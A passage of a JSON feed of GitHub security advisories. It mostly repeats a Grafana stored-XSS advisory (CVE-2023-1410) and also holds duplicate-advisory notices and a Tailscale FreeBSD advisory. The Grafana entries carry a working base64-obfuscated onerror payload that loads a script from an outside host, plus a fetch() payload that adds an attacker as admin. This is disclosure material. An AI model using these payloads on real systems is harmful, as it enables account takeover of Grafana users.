id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))&gt;\n                                                                           \n  \"\"\"                  \n  if len(seriesListFirstPos) != len(seriesListSecondPos):   \n    raise InputParameterError(             \n      \"seriesListFirstPos and seriesListSecondPos argument must have equal length\")\n  results = []                                          \n                                    \n  for i in range(0, len(seriesListFirstPos)):        \n    firstSeries = seriesListFirstPos[i]                                           \n    secondSeries = seriesListSecondPos[i]         \n    aggregated = aggregate(requestContext, (firstSeries, secondSeries), func, xFilesFactor=xFilesFactor) \n    if not aggregated: # empty list, no data found                          \n      continue                   \n    result = aggregated[0]  # aggregate() can only return len 1 list           \n    result.name = result.name[:result.name.find('Series(')] + 'Series(%s,%s)' % (firstSeries.name, secondSeries.name)\n    results.append(result)                                                                           \n  return results                                                         \n                                                                                                                   \n                                                                                                       \naggregateSeriesLists.group = 'Combine'                                                             \naggregateSeriesLists.params = [\n  Param('seriesListFirstPos', ParamTypes.seriesList, required=True),\n  Param('seriesListSecondPos', ParamTypes.seriesList, required=True),\n  Param('func', ParamTypes.aggFunc, required=True),                                                       \n  Param('xFilesFactor', ParamTypes.float),                                \n]                                                                                                \n</code></pre>\n<ol start=\"4\">\n<li>Save and quit the file. Restart your Graphite Container (I did this using the Restart Icon in Docker Desktop)</li>\n<li>Now login to your Grafana instance as an Organisation Admin.</li>\n<li>Navigate to http://[grafana]/plugins/graphite and click <code>Create a Graphite data source</code></li>\n<li>Add the url to the attackers Graphite instance (maybe enable <code>Skip TLS Verify</code>) and click <code>Save &amp; test</code> and <code>Explore</code></li>\n<li>In the newly opened page click the + icon next to <code>Functions</code> and search for <code>aggregateSeriesLists</code> and click it to add it.</li>\n<li>Now hover over <code>aggregateSeriesLists</code> with your mouse and move your mouse to the <code>?</code> icon.</li>\n</ol>\n<h3 id=\"result\">Result</h3>\n<p>Our payload will trigger and in this case it will include an external script to trigger the alerts.</p>\n<h4 id=\"decoded-payload\">Decoded payload</h4>\n<pre><code class=\"language-javascript\">var a=document.createElement(\"script\");a.src=\"https://cm2.tel\";document.body.appendChild(a);\n</code></pre>\n<p><img alt=\"image\" src=\"https://user-images.githubusercontent.com/26874824/225035735-5d00e5d9-3302-4257-8f95-dd562e752893.png\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>In the POC we've picked 1 function to have a XSS payload, but a real attacker would of course maximize the likelihood by replacing all of it's descriptions with XSS payloads. As shown above the attacker can now run arbitrary javascript in the browser of the victim. The victim can be any user using the malicious Graphite instance in a query (or while Exploring), including the Organisation Admin. If so, an attacker could include a payload to add them as an admin themselves.</p>\n<p>An example would be something like this:</p>\n<pre><code class=\"language-javascript\">fetch(\"/api/org/invites\", {\n  \"headers\": {\n    \"content-type\": \"application/json\"\n  },\n  \"body\": \"{\\\"name\\\":\\\"\\\",\\\"email\\\":\\\"\\\",\\\"role\\\":\\\"Admin\\\",\\\"sendEmail\\\":true,\\\"loginOrEmail\\\":\\\"hacker@hacker.com\\\"}\",\n  \"method\": \"POST\",\n  \"credentials\": \"include\"\n});\n</code></pre>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>The vulnerability seems to occur in the following file: public\\app\\plugins\\datasource\\graphite\\components\\FunctionEditorControls.tsx</p>\n<pre><code class=\"language-typescript\">const FunctionDescription = React.lazy(async () =&gt; {\n  // @ts-ignore\n  const { default: rst2html } = await import(/* webpackChunkName: \"rst2html\" */ 'rst2html');\n  return {\n    default(props: { description?: string }) {\n      return &lt;div dangerouslySetInnerHTML={{ __html: rst2html(props.description ?? '') }} /&gt;;\n    },\n  };\n});\n</code></pre>\n<p>In many other similar cases, some form of sanitization is used. I would advise to use the same here as rst2html itself will just leave HTML untouched when parsing the expected reStructuredText from Graphite. So now when it is applied using dangerouslySetInnerHTML our XSS payload will survive.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76\">https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-1410\">https://nvd.nist.gov/vuln/detail/CVE-2023-1410</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/42911348a76e8484396b951bef8b7bff97a84cbc\">https://github.com/grafana/grafana/commit/42911348a76e8484396b951bef8b7bff97a84cbc</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/e59427c0747ae2f3feb1bfc3a4b87f0886208cc6\">https://github.com/grafana/grafana/commit/e59427c0747ae2f3feb1bfc3a4b87f0886208cc6</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/ef2eb2b6bf1d7c0fb781e3e05d0d1aecd6dd438a\">https://github.com/grafana/grafana/commit/ef2eb2b6bf1d7c0fb781e3e05d0d1aecd6dd438a</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/f9548d33f8624d6694983fe5aad181007405be8a\">https://github.com/grafana/grafana/commit/f9548d33f8624d6694983fe5aad181007405be8a</a></li>\n<li><a href=\"https://grafana.com/security/security-advisories/cve-2023-1410/\">https://grafana.com/security/security-advisories/cve-2023-1410/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qrrg-gw7w-vp76\">https://github.com/advisories/GHSA-qrrg-gw7w-vp76</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qrrg-gw7w-vp76",
            "title": "[github.com/grafana/grafana] Grafana Stored Cross-site Scripting in Graphite FunctionDescription tooltip",
            "date_modified": "2023-03-23T20:10:48.000Z",
            "date_published": "2023-03-23T20:10:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qrrg-gw7w-vp76"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When a Graphite data source is added, one can use this data source in a dashboard. This contains a feature to use <code>Functions</code>. Once a function is selected, a small tooltip will be shown when hovering over the name of the function. This tooltip will allow you to delete the selected Function from your query or show the Function Description. However, no sanitization is done when adding this description to the DOM. Since it is not uncommon to connect to public data sources, and attacker could host a Graphite instance with modified Function Descriptions containing XSS payloads. When the victim uses it in a query and accidentally hovers over the Function Description, an attacker controlled XSS payload will be executed. This can be used to add the attacker as an Admin for example. </p>\n<h3 id=\"details\">Details</h3>\n<ol>\n<li>Spin up your own Graphite instance. I've done this using the <code>make devenv sources=graphite</code>.</li>\n<li>Now start a terminal for your Graphite container and modify the following file <code>/opt/graphite/webapp/graphite/render/functions.py</code> </li>\n<li>Basically you can pick any function but I picked the <code>aggregateSeriesLists</code> function. Modify its description to be <code>\"&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))&gt;</code></li>\n</ol>\n<p>The result would look like this:</p>\n<pre><code class=\"language-python\">def aggregateSeriesLists(requestContext, seriesListFirstPos, seriesListSecondPos, func, xFilesFactor=None):\n  \"\"\"                                                                              \n                                                                                              \n  \"&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))&gt;\n                                                                           \n  \"\"\"                  \n  if len(seriesListFirstPos) != len(seriesListSecondPos):   \n    raise InputParameterError(             \n      \"seriesListFirstPos and seriesListSecondPos argument must have equal length\")\n  results = []                                          \n                                    \n  for i in range(0, len(seriesListFirstPos)):        \n    firstSeries = seriesListFirstPos[i]                                           \n    secondSeries = seriesListSecondPos[i]         \n    aggregated = aggregate(requestContext, (firstSeries, secondSeries), func, xFilesFactor=xFilesFactor) \n    if not aggregated: # empty list, no data found                          \n      continue                   \n    result = aggregated[0]  # aggregate() can only return len 1 list           \n    result.name = result.name[:result.name.find('Series(')] + 'Series(%s,%s)' % (firstSeries.name, secondSeries.name)\n    results.append(result)                                                                           \n  return results                                                         \n                                                                                                                   \n                                                                                                       \naggregateSeriesLists.group = 'Combine'                                                             \naggregateSeriesLists.params = [\n  Param('seriesListFirstPos', ParamTypes.seriesList, required=True),\n  Param('seriesListSecondPos', ParamTypes.seriesList, required=True),\n  Param('func', ParamTypes.aggFunc, required=True),                                                       \n  Param('xFilesFactor', ParamTypes.float),                                \n]                                                                                                \n</code></pre>\n<ol start=\"4\">\n<li>Save and quit the file. Restart your Graphite Container (I did this using the Restart Icon in Docker Desktop)</li>\n<li>Now login to your Grafana instance as an Organisation Admin.</li>\n<li>Navigate to http://[grafana]/plugins/graphite and click <code>Create a Graphite data source</code></li>\n<li>Add the url to the attackers Graphite instance (maybe enable <code>Skip TLS Verify</code>) and click <code>Save &amp; test</code> and <code>Explore</code></li>\n<li>In the newly opened page click the + icon next to <code>Functions</code> and search for <code>aggregateSeriesLists</code> and click it to add it.</li>\n<li>Now hover over <code>aggregateSeriesLists</code> with your mouse and move your mouse to the <code>?</code> icon.</li>\n</ol>\n<h3 id=\"result\">Result</h3>\n<p>Our payload will trigger and in this case it will include an external script to trigger the alerts.</p>\n<h4 id=\"decoded-payload\">Decoded payload</h4>\n<pre><code class=\"language-javascript\">var a=document.createElement(\"script\");a.src=\"https://cm2.tel\";document.body.appendChild(a);\n</code></pre>\n<p><img alt=\"image\" src=\"https://user-images.githubusercontent.com/26874824/225035735-5d00e5d9-3302-4257-8f95-dd562e752893.png\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>In the POC we've picked 1 function to have a XSS payload, but a real attacker would of course maximize the likelihood by replacing all of it's descriptions with XSS payloads. As shown above the attacker can now run arbitrary javascript in the browser of the victim. The victim can be any user using the malicious Graphite instance in a query (or while Exploring), including the Organisation Admin. If so, an attacker could include a payload to add them as an admin themselves.</p>\n<p>An example would be something like this:</p>\n<pre><code class=\"language-javascript\">fetch(\"/api/org/invites\", {\n  \"headers\": {\n    \"content-type\": \"application/json\"\n  },\n  \"body\": \"{\\\"name\\\":\\\"\\\",\\\"email\\\":\\\"\\\",\\\"role\\\":\\\"Admin\\\",\\\"sendEmail\\\":true,\\\"loginOrEmail\\\":\\\"hacker@hacker.com\\\"}\",\n  \"method\": \"POST\",\n  \"credentials\": \"include\"\n});\n</code></pre>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>The vulnerability seems to occur in the following file: public\\app\\plugins\\datasource\\graphite\\components\\FunctionEditorControls.tsx</p>\n<pre><code class=\"language-typescript\">const FunctionDescription = React.lazy(async () =&gt; {\n  // @ts-ignore\n  const { default: rst2html } = await import(/* webpackChunkName: \"rst2html\" */ 'rst2html');\n  return {\n    default(props: { description?: string }) {\n      return &lt;div dangerouslySetInnerHTML={{ __html: rst2html(props.description ?? '') }} /&gt;;\n    },\n  };\n});\n</code></pre>\n<p>In many other similar cases, some form of sanitization is used. I would advise to use the same here as rst2html itself will just leave HTML untouched when parsing the expected reStructuredText from Graphite. So now when it is applied using dangerouslySetInnerHTML our XSS payload will survive.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76\">https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-1410\">https://nvd.nist.gov/vuln/detail/CVE-2023-1410</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/42911348a76e8484396b951bef8b7bff97a84cbc\">https://github.com/grafana/grafana/commit/42911348a76e8484396b951bef8b7bff97a84cbc</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/e59427c0747ae2f3feb1bfc3a4b87f0886208cc6\">https://github.com/grafana/grafana/commit/e59427c0747ae2f3feb1bfc3a4b87f0886208cc6</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/ef2eb2b6bf1d7c0fb781e3e05d0d1aecd6dd438a\">https://github.com/grafana/grafana/commit/ef2eb2b6bf1d7c0fb781e3e05d0d1aecd6dd438a</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/f9548d33f8624d6694983fe5aad181007405be8a\">https://github.com/grafana/grafana/commit/f9548d33f8624d6694983fe5aad181007405be8a</a></li>\n<li><a href=\"https://grafana.com/security/security-advisories/cve-2023-1410/\">https://grafana.com/security/security-advisories/cve-2023-1410/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qrrg-gw7w-vp76\">https://github.com/advisories/GHSA-qrrg-gw7w-vp76</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qrrg-gw7w-vp76",
            "title": "[github.com/grafana/grafana] Grafana Stored Cross-site Scripting in Graphite FunctionDescription tooltip",
            "date_modified": "2023-03-23T20:10:48.000Z",
            "date_published": "2023-03-23T20:10:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qrrg-gw7w-vp76"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When a Graphite data source is added, one can use this data source in a dashboard. This contains a feature to use <code>Functions</code>. Once a function is selected, a small tooltip will be shown when hovering over the name of the function. This tooltip will allow you to delete the selected Function from your query or show the Function Description. However, no sanitization is done when adding this description to the DOM. Since it is not uncommon to connect to public data sources, and attacker could host a Graphite instance with modified Function Descriptions containing XSS payloads. When the victim uses it in a query and accidentally hovers over the Function Description, an attacker controlled XSS payload will be executed. This can be used to add the attacker as an Admin for example. </p>\n<h3 id=\"details\">Details</h3>\n<ol>\n<li>Spin up your own Graphite instance. I've done this using the <code>make devenv sources=graphite</code>.</li>\n<li>Now start a terminal for your Graphite container and modify the following file <code>/opt/graphite/webapp/graphite/render/functions.py</code> </li>\n<li>Basically you can pick any function but I picked the <code>aggregateSeriesLists</code> function. Modify its description to be <code>\"&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))&gt;</code></li>\n</ol>\n<p>The result would look like this:</p>\n<pre><code class=\"language-python\">def aggregateSeriesLists(requestContext, seriesListFirstPos, seriesListSecondPos, func, xFilesFactor=None):\n  \"\"\"                                                                              \n                                                                                              \n  \"&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))&gt;\n                                                                           \n  \"\"\"                  \n  if len(seriesListFirstPos) != len(seriesListSecondPos):   \n    raise InputParameterError(             \n      \"seriesListFirstPos and seriesListSecondPos argument must have equal length\")\n  results = []                                          \n                                    \n  for i in range(0, len(seriesListFirstPos)):        \n    firstSeries = seriesListFirstPos[i]                                           \n    secondSeries = seriesListSecondPos[i]         \n    aggregated = aggregate(requestContext, (firstSeries, secondSeries), func, xFilesFactor=xFilesFactor) \n    if not aggregated: # empty list, no data found                          \n      continue                   \n    result = aggregated[0]  # aggregate() can only return len 1 list           \n    result.name = result.name[:result.name.find('Series(')] + 'Series(%s,%s)' % (firstSeries.name, secondSeries.name)\n    results.append(result)                                                                           \n  return results                                                         \n                                                                                                                   \n                                                                                                       \naggregateSeriesLists.group = 'Combine'                                                             \naggregateSeriesLists.params = [\n  Param('seriesListFirstPos', ParamTypes.seriesList, required=True),\n  Param('seriesListSecondPos', ParamTypes.seriesList, required=True),\n  Param('func', ParamTypes.aggFunc, required=True),                                                       \n  Param('xFilesFactor', ParamTypes.float),                                \n]                                                                                                \n</code></pre>\n<ol start=\"4\">\n<li>Save and quit the file. Restart your Graphite Container (I did this using the Restart Icon in Docker Desktop)</li>\n<li>Now login to your Grafana instance as an Organisation Admin.</li>\n<li>Navigate to http://[grafana]/plugins/graphite and click <code>Create a Graphite data source</code></li>\n<li>Add the url to the attackers Graphite instance (maybe enable <code>Skip TLS Verify</code>) and click <code>Save &amp; test</code> and <code>Explore</code></li>\n<li>In the newly opened page click the + icon next to <code>Functions</code> and search for <code>aggregateSeriesLists</code> and click it to add it.</li>\n<li>Now hover over <code>aggregateSeriesLists</code> with your mouse and move your mouse to the <code>?</code> icon.</li>\n</ol>\n<h3 id=\"result\">Result</h3>\n<p>Our payload will trigger and in this case it will include an external script to trigger the alerts.</p>\n<h4 id=\"decoded-payload\">Decoded payload</h4>\n<pre><code class=\"language-javascript\">var a=document.createElement(\"script\");a.src=\"https://cm2.tel\";document.body.appendChild(a);\n</code></pre>\n<p><img alt=\"image\" src=\"https://user-images.githubusercontent.com/26874824/225035735-5d00e5d9-3302-4257-8f95-dd562e752893.png\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>In the POC we've picked 1 function to have a XSS payload, but a real attacker would of course maximize the likelihood by replacing all of it's descriptions with XSS payloads. As shown above the attacker can now run arbitrary javascript in the browser of the victim. The victim can be any user using the malicious Graphite instance in a query (or while Exploring), including the Organisation Admin. If so, an attacker could include a payload to add them as an admin themselves.</p>\n<p>An example would be something like this:</p>\n<pre><code class=\"language-javascript\">fetch(\"/api/org/invites\", {\n  \"headers\": {\n    \"content-type\": \"application/json\"\n  },\n  \"body\": \"{\\\"name\\\":\\\"\\\",\\\"email\\\":\\\"\\\",\\\"role\\\":\\\"Admin\\\",\\\"sendEmail\\\":true,\\\"loginOrEmail\\\":\\\"hacker@hacker.com\\\"}\",\n  \"method\": \"POST\",\n  \"credentials\": \"include\"\n});\n</code></pre>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>The vulnerability seems to occur in the following file: public\\app\\plugins\\datasource\\graphite\\components\\FunctionEditorControls.tsx</p>\n<pre><code class=\"language-typescript\">const FunctionDescription = React.lazy(async () =&gt; {\n  // @ts-ignore\n  const { default: rst2html } = await import(/* webpackChunkName: \"rst2html\" */ 'rst2html');\n  return {\n    default(props: { description?: string }) {\n      return &lt;div dangerouslySetInnerHTML={{ __html: rst2html(props.description ?? '') }} /&gt;;\n    },\n  };\n});\n</code></pre>\n<p>In many other similar cases, some form of sanitization is used. I would advise to use the same here as rst2html itself will just leave HTML untouched when parsing the expected reStructuredText from Graphite. So now when it is applied using dangerouslySetInnerHTML our XSS payload will survive.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76\">https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-1410\">https://nvd.nist.gov/vuln/detail/CVE-2023-1410</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/42911348a76e8484396b951bef8b7bff97a84cbc\">https://github.com/grafana/grafana/commit/42911348a76e8484396b951bef8b7bff97a84cbc</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/e59427c0747ae2f3feb1bfc3a4b87f0886208cc6\">https://github.com/grafana/grafana/commit/e59427c0747ae2f3feb1bfc3a4b87f0886208cc6</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/ef2eb2b6bf1d7c0fb781e3e05d0d1aecd6dd438a\">https://github.com/grafana/grafana/commit/ef2eb2b6bf1d7c0fb781e3e05d0d1aecd6dd438a</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/f9548d33f8624d6694983fe5aad181007405be8a\">https://github.com/grafana/grafana/commit/f9548d33f8624d6694983fe5aad181007405be8a</a></li>\n<li><a href=\"https://grafana.com/security/security-advisories/cve-2023-1410/\">https://grafana.com/security/security-advisories/cve-2023-1410/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qrrg-gw7w-vp76\">https://github.com/advisories/GHSA-qrrg-gw7w-vp76</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qrrg-gw7w-vp76",
            "title": "[github.com/grafana/grafana] Grafana Stored Cross-site Scripting in Graphite FunctionDescription tooltip",
            "date_modified": "2023-03-23T20:10:48.000Z",
            "date_published": "2023-03-23T20:10:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qrrg-gw7w-vp76"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"duplicate-advisory\">Duplicate Advisory</h2>\n<p>This advisory has been withdrawn because it is a duplicate of <a href=\"https://github.com/advisories/GHSA-qrrg-gw7w-vp76\">GHSA-qrrg-gw7w-vp76</a>. This link is maintained to preserve external references.</p>\n<h2 id=\"original-description\">Original Description</h2>\n<p>Grafana is an open-source platform for monitoring and observability. Grafana had a stored XSS vulnerability in the Graphite FunctionDescription tooltip. The stored XSS vulnerability was possible due the value of the Function Description was not properly sanitized. An attacker needs to have control over the Graphite data source in order to manipulate a function description and a Grafana admin needs to configure the data source, later a Grafana user needs to select a tampered function and hover over the description. Users may upgrade to version 8.5.22, 9.2.15 and 9.3.11 to receive a fix.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76\">https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-1410\">https://nvd.nist.gov/vuln/detail/CVE-2023-1410</a></li>\n<li><a href=\"https://grafana.com/security/security-advisories/cve-2023-1410/\">https://grafana.com/security/security-advisories/cve-2023-1410/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3cgw-hfw7-wc7j\">https://github.com/advisories/GHSA-3cgw-hfw7-wc7j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3cgw-hfw7-wc7j",
            "title": "[github.com/grafana/grafana] Duplicate Advisory: Grafana Stored Cross-site Scripting vulnerability",
            "date_modified": "2023-03-27T22:32:20.000Z",
            "date_published": "2023-03-23T09:30:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3cgw-hfw7-wc7j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"duplicate-advisory\">Duplicate Advisory</h2>\n<p>This advisory has been withdrawn because it is a duplicate of <a href=\"https://github.com/advisories/GHSA-qrrg-gw7w-vp76\">GHSA-qrrg-gw7w-vp76</a>. This link is maintained to preserve external references.</p>\n<h2 id=\"original-description\">Original Description</h2>\n<p>Grafana is an open-source platform for monitoring and observability. Grafana had a stored XSS vulnerability in the Graphite FunctionDescription tooltip. The stored XSS vulnerability was possible due the value of the Function Description was not properly sanitized. An attacker needs to have control over the Graphite data source in order to manipulate a function description and a Grafana admin needs to configure the data source, later a Grafana user needs to select a tampered function and hover over the description. Users may upgrade to version 8.5.22, 9.2.15 and 9.3.11 to receive a fix.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76\">https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-1410\">https://nvd.nist.gov/vuln/detail/CVE-2023-1410</a></li>\n<li><a href=\"https://grafana.com/security/security-advisories/cve-2023-1410/\">https://grafana.com/security/security-advisories/cve-2023-1410/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3cgw-hfw7-wc7j\">https://github.com/advisories/GHSA-3cgw-hfw7-wc7j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3cgw-hfw7-wc7j",
            "title": "[github.com/grafana/grafana] Duplicate Advisory: Grafana Stored Cross-site Scripting vulnerability",
            "date_modified": "2023-03-27T22:32:20.000Z",
            "date_published": "2023-03-23T09:30:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3cgw-hfw7-wc7j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"duplicate-advisory\">Duplicate Advisory</h2>\n<p>This advisory has been withdrawn because it is a duplicate of <a href=\"https://github.com/advisories/GHSA-qrrg-gw7w-vp76\">GHSA-qrrg-gw7w-vp76</a>. This link is maintained to preserve external references.</p>\n<h2 id=\"original-description\">Original Description</h2>\n<p>Grafana is an open-source platform for monitoring and observability. Grafana had a stored XSS vulnerability in the Graphite FunctionDescription tooltip. The stored XSS vulnerability was possible due the value of the Function Description was not properly sanitized. An attacker needs to have control over the Graphite data source in order to manipulate a function description and a Grafana admin needs to configure the data source, later a Grafana user needs to select a tampered function and hover over the description. Users may upgrade to version 8.5.22, 9.2.15 and 9.3.11 to receive a fix.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76\">https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-1410\">https://nvd.nist.gov/vuln/detail/CVE-2023-1410</a></li>\n<li><a href=\"https://grafana.com/security/security-advisories/cve-2023-1410/\">https://grafana.com/security/security-advisories/cve-2023-1410/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3cgw-hfw7-wc7j\">https://github.com/advisories/GHSA-3cgw-hfw7-wc7j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3cgw-hfw7-wc7j",
            "title": "[github.com/grafana/grafana] Duplicate Advisory: Grafana Stored Cross-site Scripting vulnerability",
            "date_modified": "2023-03-27T22:32:20.000Z",
            "date_published": "2023-03-23T09:30:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3cgw-hfw7-wc7j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability identified in the implementation of Tailscale SSH in FreeBSD allowed commands to be run with a higher privilege group ID than that specified by Tailscale SSH access rules.</p>\n<p><strong>Affected platforms</strong>: FreeBSD</p>\n<p><strong>Patched Tailscale client versions</strong>: v1.38.2 or later</p>\n<h3 id=\"what-happened\">What happened?</h3>\n<p>A difference in the behavior of the FreeBSD <code>setgroups</code> system call from POSIX meant that the Tailscale client running on a FreeBSD-based operating system did not appropriately restrict groups on the host when using Tailscale SSH. When accessing a FreeBSD host over Tailscale SSH, the egid of the tailscaled process was used instead of that of the user specified in Tailscale SSH access rules.</p>\n<h3 id=\"who-is-affected\">Who is affected?</h3>\n<p>9 tailnets with 22 FreeBSD nodes running Tailscale SSH since Tailscale v1.34 (released on 2022-12-04) may have had Tailscale SSH sessions with a higher privilege group ID than that specified in Tailscale SSH access rules.</p>\n<p>We have notified the affected organizations where we have <a href=\"https://tailscale.com/kb/1224/contact-preferences/#setting-the-security-issues-email\">security contacts</a>.</p>\n<h3 id=\"what-is-the-impact\">What is the impact?</h3>\n<p>Tailscale SSH commands may have been run with a higher privilege group ID than that specified in Tailscale SSH access rules if they met all of the following criteria:</p>\n<ul>\n<li>The destination node was a FreeBSD device with Tailscale SSH enabled;</li>\n<li>Tailscale SSH access rules permitted access for non-root users; and</li>\n<li>A non-interactive SSH session was used.</li>\n</ul>\n<h3 id=\"what-do-i-need-to-do\">What do I need to do?</h3>\n<p>If you are running Tailscale on FreeBSD, upgrade to v1.38.2 or later to remediate the issue. Admins of a tailnet can view <a href=\"https://login.tailscale.com/admin/machines?q=version%3A%3C1.38.2+freebsd\">FreeBSD nodes with unpatched versions</a> in the admin console.</p>\n<p>To update the local ports tree in advance of what's available upstream, you can:</p>\n<ol>\n<li><code>cd /usr/ports/security/tailscale</code></li>\n<li>edit the Makefile to set <code>PORTVERSION</code> to <code>1.38.2</code></li>\n<li><code>make makesum</code></li>\n<li><code>make install</code></li>\n</ol>\n<p>Tailscale SSH on other platforms is not affected.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>We would like to thank <a href=\"https://www.linkedin.com/in/rbelgrave/\">Ryan Belgrave</a> for reporting this issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://tailscale.com/security-bulletins/#ts-2023-003\">TS-2023-003</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tailscale/tailscale/security/advisories/GHSA-vfgq-g5x8-g595\">https://github.com/tailscale/tailscale/security/advisories/GHSA-vfgq-g5x8-g595</a></li>\n<li><a href=\"https://github.com/tailscale/tailscale/commit/d00c046b723dff6e3775d7d35f891403ac21a47d\">https://github.com/tailscale/tailscale/commit/d00c046b723dff6e3775d7d35f891403ac21a47d</a></li>\n<li><a href=\"https://github.com/tailscale/tailscale/releases/tag/v1.38.2\">https://github.com/tailscale/tailscale/releases/tag/v1.38.2</a></li>\n<li><a href=\"https://tailscale.com/security-bulletins/#ts-2023-003\">https://tailscale.com/security-bulletins/#ts-2023-003</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-28436\">https://nvd.nist.gov/vuln/detail/CVE-2023-28436</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vfgq-g5x8-g595\">https://github.com/advisories/GHSA-vfgq-g5x8-g595</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vfgq-g5x8-g595",
            "title": "[tailscale.com] Non-interactive Tailscale SSH sessions on FreeBSD may use the effective group ID of the tailscaled process",
